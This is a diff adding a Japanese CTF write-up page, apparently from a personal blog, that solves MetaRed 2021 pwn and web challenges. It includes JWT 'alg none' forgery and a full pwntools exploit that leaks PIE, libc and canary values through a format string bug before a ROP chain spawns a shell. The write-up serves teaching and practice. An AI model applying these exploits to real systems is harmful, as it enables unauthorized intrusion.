+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">base_addr</span><span class="o">+</span><span class="n">elf</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s1">&#39;vuln&#39;</span><span class="p">])</span>
+
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;advance: </span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<h2 id="web-back-to-basic-web-100pts">[web] Back to Basic Web 100pts<a class="headerlink" href="#web-back-to-basic-web-100pts" title="Permanent link">&para;</a></h2>
+<p>コードを探すとそれっぽい Base64 が 2 つあるので、組み合わせるだけです。</p>
+<h2 id="web-vulns-none-100pts">[web] Vulns? None 100pts<a class="headerlink" href="#web-vulns-none-100pts" title="Permanent link">&para;</a></h2>
+<p>JWT の問題です。Cookie の Token に JWT が入っているんですが、アルゴリズムを <code>none</code> に書き換えると改竄チェックがなくなる場合があるって話です。割と有名</p>
+<p>あとは <code>id</code> を <code>admin</code> に変えるとフラグゲット</p>
+<h2 id="pwn-leaky-shell-477pts">[pwn] Leaky Shell 477pts<a class="headerlink" href="#pwn-leaky-shell-477pts" title="Permanent link">&para;</a></h2>
+<p>stripped バイナリです。いやらしい！</p>
+<div class="highlight"><pre><span></span><code>    Arch:     amd64-64-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+</code></pre></div>
+<details class="note"><summary>Decompiled Code</summary><p><div class="highlight"><pre><span></span><code><span class="n">undefined8</span> <span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">long</span> <span class="n">lVar1</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">iVar2</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">int</span> <span class="n">local_18</span><span class="p">;</span>
+
+  <span class="n">lVar1</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">alarm</span><span class="p">(</span><span class="mh">0x1e</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdin</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">setvbuf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="mh">0x0</span><span class="p">,</span><span class="mi">2</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span>
+  <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot; == Unseen shell v0.1 ==</span><span class="se">\n\n</span><span class="s">&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x1a</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="k">do</span> <span class="p">{</span>
+    <span class="n">check</span><span class="p">(</span><span class="s">&quot;aveiro&quot;</span><span class="p">,</span><span class="s">&quot;4v31r0P4ss&quot;</span><span class="p">);</span>
+    <span class="k">do</span> <span class="p">{</span>
+      <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Try again? y/n: &quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="n">stderr</span><span class="p">);</span>
+      <span class="n">iVar2</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="mi">-1</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="n">lVar1</span> <span class="o">==</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+          <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+        <span class="p">}</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+        <span class="n">__stack_chk_fail</span><span class="p">();</span>
+      <span class="p">}</span>
+      <span class="n">local_18</span> <span class="o">=</span> <span class="mh">0x30</span><span class="p">;</span>
+      <span class="k">while</span> <span class="p">((</span><span class="n">local_18</span> <span class="o">!=</span> <span class="mi">10</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="n">local_18</span> <span class="o">!=</span> <span class="mi">-1</span><span class="p">)))</span> <span class="p">{</span>
+        <span class="n">local_18</span> <span class="o">=</span> <span class="n">getchar</span><span class="p">();</span>
+      <span class="p">}</span>
+      <span class="k">if</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">==</span> <span class="mh">0x6e</span><span class="p">)</span> <span class="p">{</span>
+        <span class="n">_Exit</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
+      <span class="p">}</span>
+    <span class="p">}</span> <span class="k">while</span> <span class="p">(</span><span class="n">iVar2</span> <span class="o">!=</span> <span class="mh">0x79</span><span class="p">);</span>
+  <span class="p">}</span> <span class="k">while</span><span class="p">(</span> <span class="nb">true</span> <span class="p">);</span>
+<span class="p">}</span>
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><span class="kt">void</span> <span class="nf">check</span><span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_1</span><span class="p">,</span><span class="kt">char</span> <span class="o">*</span><span class="n">param_2</span><span class="p">)</span>
+
+<span class="p">{</span>
+  <span class="kt">int</span> <span class="n">iVar1</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">__n</span><span class="p">;</span>
+  <span class="kt">long</span> <span class="n">in_FS_OFFSET</span><span class="p">;</span>
+  <span class="kt">char</span> <span class="n">password</span> <span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+  <span class="kt">char</span> <span class="n">username</span><span class="p">;</span>
+  <span class="n">undefined</span> <span class="n">auStack39</span> <span class="p">[</span><span class="mi">23</span><span class="p">];</span>
+  <span class="kt">long</span> <span class="n">local_10</span><span class="p">;</span>
+
+  <span class="n">local_10</span> <span class="o">=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">);</span>
+  <span class="n">memcpy</span><span class="p">(</span><span class="o">&amp;</span><span class="n">DAT_001040e0</span><span class="p">,</span><span class="n">auStack39</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
+  <span class="n">memset</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mi">0</span><span class="p">,</span><span class="mh">0x10</span><span class="p">);</span>
+  <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;User: &quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">6</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="n">fgets</span><span class="p">(</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span><span class="mh">0x10</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+  <span class="n">__n</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">param_1</span><span class="p">);</span>
+  <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">param_1</span><span class="p">,</span><span class="o">&amp;</span><span class="n">username</span><span class="p">,</span><span class="n">__n</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+    <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Password: &quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">10</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="n">fgets</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="mh">0x100</span><span class="p">,</span><span class="n">stdin</span><span class="p">);</span>
+    <span class="n">__n</span> <span class="o">=</span> <span class="n">strlen</span><span class="p">(</span><span class="n">param_2</span><span class="p">);</span>
+    <span class="n">iVar1</span> <span class="o">=</span> <span class="n">strncmp</span><span class="p">(</span><span class="n">password</span><span class="p">,</span><span class="n">param_2</span><span class="p">,</span><span class="n">__n</span><span class="p">);</span>
+    <span class="k">if</span> <span class="p">(</span><span class="n">iVar1</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+      <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Welcome &quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mi">8</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+      <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="o">&amp;</span><span class="n">username</span><span class="p">);</span>
+    <span class="p">}</span>
+    <span class="k">else</span> <span class="p">{</span>
+      <span class="n">memcpy</span><span class="p">(</span><span class="n">auStack39</span><span class="p">,</span><span class="o">&amp;</span><span class="n">DAT_001040e0</span><span class="p">,</span><span class="mh">0x30</span><span class="p">);</span>
+      <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Invalid password</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0x11</span><span class="p">,</span><span class="n">stderr</span><span class="p">);</span>
+    <span class="p">}</span>
+  <span class="p">}</span>
+  <span class="k">else</span> <span class="p">{</span>
+    <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Invalid user: &quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0xe</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="o">&amp;</span><span class="n">username</span><span class="p">);</span>
+  <span class="p">}</span>
+  <span class="n">fputc</span><span class="p">(</span><span class="mi">10</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+  <span class="k">if</span> <span class="p">(</span><span class="n">local_10</span> <span class="o">!=</span> <span class="o">*</span><span class="p">(</span><span class="kt">long</span> <span class="o">*</span><span class="p">)(</span><span class="n">in_FS_OFFSET</span> <span class="o">+</span> <span class="mh">0x28</span><span class="p">))</span> <span class="p">{</span>
+                    <span class="cm">/* WARNING: Subroutine does not return */</span>
+    <span class="n">__stack_chk_fail</span><span class="p">();</span>
+  <span class="p">}</span>
+  <span class="k">return</span><span class="p">;</span>
+<span class="p">}</span>
+</code></pre></div></p>
+</details>
+<p><code>check</code> 関数を見ると、明らかに Format String Bug があります。が、入力が 0x10 文字しかないのでこれだけでは攻撃が成立しません。
+<div class="highlight"><pre><span></span><code><span class="k">else</span> <span class="p">{</span>
+    <span class="n">fwrite</span><span class="p">(</span><span class="s">&quot;Invalid user: &quot;</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="mh">0xe</span><span class="p">,</span><span class="n">stdout</span><span class="p">);</span>
+    <span class="n">fprintf</span><span class="p">(</span><span class="n">stdout</span><span class="p">,</span><span class="o">&amp;</span><span class="n">username</span><span class="p">);</span> <span class="c1">// Bug</span>
+<span class="p">}</span>
+</code></pre></div>
+<code>password</code> の入力では Buffer Over Flow もあります。なお、SSP が掛かっているため Canary を置く必要があります。
+また、間違えた <code>password</code> を入力するとスタックが復元されてしまうため攻撃できないのではないかと思われますが、チェックが先頭の実際のパスワードの長さ分しかないので、先頭にパスワードを置いてその後に任意の文字列を置けます。</p>
+<p>という事で、以下のものをリークさせた後、BOF で <code>system("/bin/sh")</code> を実行する流れで行きましょう！</p>
+<ol>
+<li>ベースアドレス</li>
+<li>libc ベースアドレス</li>
+<li>Canary</li>
+</ol>
+<h3 id="_1">ベースアドレスのリーク<a class="headerlink" href="#_1" title="Permanent link">&para;</a></h3>
+<p>PIE が有効なので、libc ベースアドレスリークで GOT のアドレスを知るためにベースアドレスが必要です。</p>
+<p>スタック上にリターンアドレスが置かれているので、<code>%14$p</code> でリークした後、バイナリ内のオフセットを引けば OK です。</p>
+<h3 id="libc">libc ベースアドレスのリーク<a class="headerlink" href="#libc" title="Permanent link">&para;</a></h3>
+<p><code>system</code> を呼び出すために libc ベースアドレスが必要です。
+こちらは <code>%n$s</code> で n 番目のアドレスの先を読み取ってくれるのを利用して <code>fprintf@GOT</code> の中身、つまり <code>fprintf</code> の実際のアドレスをリークしてから libc 内の <code>fprintf</code> のオフセットを引く事で求められます。
+なお、libc は与えられていないのでリークしたアドレスを利用してから <a href="https://libc.blukat.me/">libc database</a> で照会しましょう。</p>
+<p>64bit でアドレスに NULL を含むため、アドレスは後置しないと出力が途中で止まる事に注意しましょう。
+<code>%10$sAAA[fprintf@GOT's address]</code> でリークできます。</p>
+<p>なぜか <code>strlen@GOT</code> とかだと上手く行きませんでした。うーむ</p>
+<h3 id="canary">Canary のリーク<a class="headerlink" href="#canary" title="Permanent link">&para;</a></h3>
+<p>SSP が有効なので、BOF しても Canary が違うと強制終了させられます。という事で先に Canary をリークしましょう。これもスタック上に乗っているので <code>%12$p</code> でリークできます。</p>
+<h3 id="attack">Attack!!!<a class="headerlink" href="#attack" title="Permanent link">&para;</a></h3>
+<p>準備は整ったので、後は BOF を利用して <code>system("/bin/sh")</code> を実行するだけです。libc 内に <code>"/bin/sh"</code> が入っている事を利用すると行けます。</p>
+<div class="highlight"><pre><span></span><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+
+<span class="n">elf</span><span class="o">=</span><span class="n">context</span><span class="o">.</span><span class="n">binary</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./leaky&quot;</span><span class="p">)</span>
+<span class="n">LOCAL</span><span class="o">=</span><span class="kc">True</span>
+<span class="k">if</span> <span class="n">LOCAL</span><span class="p">:</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">process</span><span class="p">(</span><span class="s2">&quot;./leaky&quot;</span><span class="p">)</span>
+    <span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;</span><span class="p">)</span>
+<span class="k">else</span><span class="p">:</span>
+    <span class="n">p</span><span class="o">=</span><span class="n">remote</span><span class="p">(</span><span class="s2">&quot;ctf-metared-2021.ua.pt&quot;</span><span class="p">,</span><span class="mi">29722</span><span class="p">)</span>
+    <span class="n">libc</span><span class="o">=</span><span class="n">ELF</span><span class="p">(</span><span class="s2">&quot;./libc&quot;</span><span class="p">)</span>
+
+<span class="c1"># Stage1: Leak base address</span>
+<span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;%14$p&quot;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;User: &quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s2">&quot;user: &quot;</span><span class="p">)</span>
+<span class="n">base_addr</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span><span class="o">-</span><span class="mh">0x14ba</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">base_addr</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;y&quot;</span><span class="p">)</span>
+
+<span class="c1"># Stage2: Leak libc base address</span>
+<span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;%10$sAAA&quot;</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s2">&quot;fprintf&quot;</span><span class="p">]</span><span class="o">+</span><span class="n">base_addr</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;User: &quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user: &quot;</span><span class="p">)</span>
+<span class="n">fprintf_addr</span><span class="o">=</span><span class="n">u64</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span><span class="o">.</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="sa">b</span><span class="s2">&quot;</span><span class="se">\x00</span><span class="s2">&quot;</span><span class="p">))</span>
+<span class="n">libc_base</span><span class="o">=</span><span class="n">fprintf_addr</span><span class="o">-</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;fprintf&quot;</span><span class="p">]</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc_base</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;y&quot;</span><span class="p">)</span>
+
+<span class="c1"># Stage3: Leak Canary Value</span>
+<span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;%12$p&quot;</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;User: &quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;user: &quot;</span><span class="p">)</span>
+<span class="n">canary</span><span class="o">=</span><span class="nb">int</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvline</span><span class="p">(),</span><span class="mi">16</span><span class="p">)</span>
+<span class="nb">print</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">canary</span><span class="p">))</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="s2">&quot;y&quot;</span><span class="p">)</span>
+
+<span class="c1"># Stage4: Attack!!</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;User: &quot;</span><span class="p">,</span><span class="s2">&quot;aveiro&quot;</span><span class="p">)</span>
+<span class="n">payload</span><span class="o">=</span><span class="sa">b</span><span class="s2">&quot;4v31r0P4ss&quot;</span><span class="o">+</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">30</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span><span class="o">+</span><span class="sa">b</span><span class="s2">&quot;A&quot;</span><span class="o">*</span><span class="mi">8</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">base_addr</span><span class="o">+</span><span class="mh">0x00001016</span><span class="p">)</span> <span class="c1"># ret;</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">base_addr</span><span class="o">+</span><span class="mh">0x000015ab</span><span class="p">)</span> <span class="c1"># pop rdi; ret;</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="nb">next</span><span class="p">(</span><span class="n">libc</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="sa">b</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">)))</span>
+<span class="n">payload</span><span class="o">+=</span><span class="n">p64</span><span class="p">(</span><span class="n">libc_base</span><span class="o">+</span><span class="n">libc</span><span class="o">.</span><span class="n">symbols</span><span class="p">[</span><span class="s2">&quot;system&quot;</span><span class="p">])</span>
+<span class="n">p</span><span class="o">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s2">&quot;Password: &quot;</span><span class="p">,</span><span class="n">payload</span><span class="p">)</span>
+<span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+                
+                  
+                    
+
+<hr>
+<div class="md-source-date">
+  <small>
+    
+      最終更新日: <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">2021年12月16日</span>
+    
+  </small>
+</div>
+                  
+                
+              
+              
+                
+
+
+              
+            </article>
+          </div>
+        </div>
+      </main>
+      
+        
+<footer class="md-footer">
+  
+    <div class="md-footer-nav">
+      <nav class="md-footer-nav__inner md-grid" aria-label="Footer">
+        
+          <a href="../../kyopro/joi2020-ho/" class="md-footer-nav__link md-footer-nav__link--prev" rel="prev">
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12z"/></svg>
+            </div>
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  前
+                </span>
+                JOI 2019/2020 本選参加記
+              </div>
+            </div>
+          </a>
+        
+        
+          <a href="../picoctf-2021/" class="md-footer-nav__link md-footer-nav__link--next" rel="next">
+            <div class="md-footer-nav__title">
+              <div class="md-ellipsis">
+                <span class="md-footer-nav__direction">
+                  次
+                </span>
+                overview
+              </div>
+            </div>
+            <div class="md-footer-nav__button md-icon">
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11H4z"/></svg>
+            </div>
+          </a>
+        
+      </nav>
+    </div>
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-footer-copyright">
+        
+        Made with
+        <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
+          Material for MkDocs
+        </a>
+      </div>
+      
+  <div class="md-footer-social">
+    
+      
+      
+        
+        
+      
+      <a href="https://github.com/ret2home/" target="_blank" rel="noopener" title="github.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+      </a>
+    
+      
+      
+        
+        
+      
+      <a href="https://twitter.com/ret2home" target="_blank" rel="noopener" title="twitter.com" class="md-footer-social__link">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path d="M459.37 151.716c.325 4.548.325 9.097.325 13.645 0 138.72-105.583 298.558-298.558 298.558-59.452 0-114.68-17.219-161.137-47.106 8.447.974 16.568 1.299 25.34 1.299 49.055 0 94.213-16.568 130.274-44.832-46.132-.975-84.792-31.188-98.112-72.772 6.498.974 12.995 1.624 19.818 1.624 9.421 0 18.843-1.3 27.614-3.573-48.081-9.747-84.143-51.98-84.143-102.985v-1.299c13.969 7.797 30.214 12.67 47.431 13.319-28.264-18.843-46.781-51.005-46.781-87.391 0-19.492 5.197-37.36 14.294-52.954 51.655 63.675 129.3 105.258 216.365 109.807-1.624-7.797-2.599-15.918-2.599-24.04 0-57.828 46.782-104.934 104.934-104.934 30.213 0 57.502 12.67 76.67 33.137 23.715-4.548 46.456-13.32 66.599-25.34-7.798 24.366-24.366 44.833-46.132 57.827 21.117-2.273 41.584-8.122 60.426-16.243-14.292 20.791-32.161 39.308-52.628 54.253z"/></svg>
+      </a>
+    
+  </div>
+
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    
+      <script src="../../assets/javascripts/vendor.6a3d08fc.min.js"></script>
+      <script src="../../assets/javascripts/bundle.71201edf.min.js"></script><script id="__lang" type="application/json">{"clipboard.copy": "\u30af\u30ea\u30c3\u30d7\u30dc\u30fc\u30c9\u3078\u30b3\u30d4\u30fc", "clipboard.copied": "\u30b3\u30d4\u30fc\u3057\u307e\u3057\u305f", "search.config.lang": "ja", "search.config.pipeline": "trimmer, stemmer", "search.config.separator": "[\\s\\-\u3000\u3001\u3002\uff0c\uff0e]+", "search.placeholder": "\u691c\u7d22", "search.result.placeholder": "\u691c\u7d22\u30ad\u30fc\u30ef\u30fc\u30c9\u3092\u5165\u529b\u3057\u3066\u304f\u3060\u3055\u3044", "search.result.none": "\u4f55\u3082\u898b\u3064\u304b\u308a\u307e\u305b\u3093\u3067\u3057\u305f", "search.result.one": "1\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.other": "#\u4ef6\u898b\u3064\u304b\u308a\u307e\u3057\u305f", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.term.missing": "Missing"}</script>
+      
+      <script>
+        app = initialize({
+          base: "../..",
+          features: ['navigation.tabs'],
+          search: Object.assign({
+            worker: "../../assets/javascripts/worker/search.4ac00218.min.js"
+          }, typeof search !== "undefined" && search)
+        })
+      </script>
+      
+        <script src="../../javascripts/config.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+    
+  </body>
+</html>
